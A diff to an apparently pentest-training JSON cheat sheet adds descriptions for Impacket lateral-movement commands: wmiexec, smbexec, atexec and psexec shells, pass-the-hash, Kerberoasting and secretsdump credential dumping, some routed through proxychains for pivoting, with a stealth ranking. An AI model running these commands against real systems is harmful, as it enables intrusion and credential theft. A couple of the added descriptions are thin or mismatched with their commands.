@@ -31,35 +31,43 @@
   "variations": [
     {
       "label": "wmiexec with hash (PtH)",
-      "command": "impacket-wmiexec -hashes :<nt_hash> <domain>/<user>@<ip>"
+      "command": "impacket-wmiexec -hashes :<nt_hash> <domain>/<user>@<ip>",
+      "description": "Uses Impacket wmiexec for semi-interactive shell access via Windows Management Instrumentation (WMI). Executes commands through the DCOM/WMI service - more stealthy than PsExec as it does not write a service binary to disk."
     },
     {
       "label": "smbexec (SMB, semi-interactive, no Python on target)",
-      "command": "impacket-smbexec <domain>/<user>:<password>@<ip>"
+      "command": "impacket-smbexec <domain>/<user>:<password>@<ip>",
+      "description": "Uses Impacket smbexec for command execution through the Windows Service Control Manager. Sends commands via SMB without uploading a binary - each command creates a temporary batch file on the target."
     },
     {
       "label": "atexec (Task Scheduler, single command)",
-      "command": "impacket-atexec <domain>/<user>:<password>@<ip> \"whoami\""
+      "command": "impacket-atexec <domain>/<user>:<password>@<ip> \"whoami\"",
+      "description": "Uses Impacket atexec for command execution through the Windows Task Scheduler service. Creates a scheduled task to run the command - an alternative execution method when WMI and SMB-based tools are blocked."
     },
     {
       "label": "psexec (drops a service - loudest, SYSTEM)",
-      "command": "impacket-psexec <domain>/<user>:<password>@<ip>"
+      "command": "impacket-psexec <domain>/<user>:<password>@<ip>",
+      "description": "Psexec (drops a service - loudest, SYSTEM). See the command syntax for exact parameters and flags."
     },
     {
       "label": "GetUserSPNs via proxychains (pivot)",
-      "command": "proxychains -q impacket-GetUserSPNs -request -dc-ip <dc_ip> <domain>/<user>"
+      "command": "proxychains -q impacket-GetUserSPNs -request -dc-ip <dc_ip> <domain>/<user>",
+      "description": "Uses Impacket GetUserSPNs to perform Kerberoasting - requests service tickets for accounts with SPNs and outputs the TGS hashes for offline cracking."
     },
     {
       "label": "psexec via proxychains PTH (pivot)",
-      "command": "proxychains -q impacket-psexec -hashes :<nt_hash> <user>@<ip>"
+      "command": "proxychains -q impacket-psexec -hashes :<nt_hash> <user>@<ip>",
+      "description": "Routes commands through a SOCKS proxy (e.g., from Chisel or SSH tunnel) for pivoting. Makes local tools appear to run from the compromised network segment."
     },
     {
       "label": "wmiexec via proxychains (pivot)",
-      "command": "proxychains -q impacket-wmiexec <domain>/<user>:<password>@<ip>"
+      "command": "proxychains -q impacket-wmiexec <domain>/<user>:<password>@<ip>",
+      "description": "Uses Impacket wmiexec for semi-interactive shell access via Windows Management Instrumentation (WMI). Executes commands through the DCOM/WMI service - more stealthy than PsExec as it does not write a service binary to disk."
     },
     {
       "label": "secretsdump via proxychains (pivot)",
-      "command": "proxychains -q impacket-secretsdump <domain>/<user>:<password>@<ip>"
+      "command": "proxychains -q impacket-secretsdump <domain>/<user>:<password>@<ip>",
+      "description": "Uses Impacket secretsdump to remotely extract password hashes and secrets from a target machine. Dumps SAM, LSA secrets, and cached credentials over the network."
     }
   ],
   "notes": "All need local-admin on the target. Stealth order (quiet->loud): wmiexec ~ atexec (no binary dropped) < smbexec < psexec (creates a service, event 7045). wmiexec/atexec run as the user; psexec gives SYSTEM. All accept -hashes for pass-the-hash. Also covered in: OSCP PEN-200 Chapter 23 (Lateral Movement in Active Directory).",
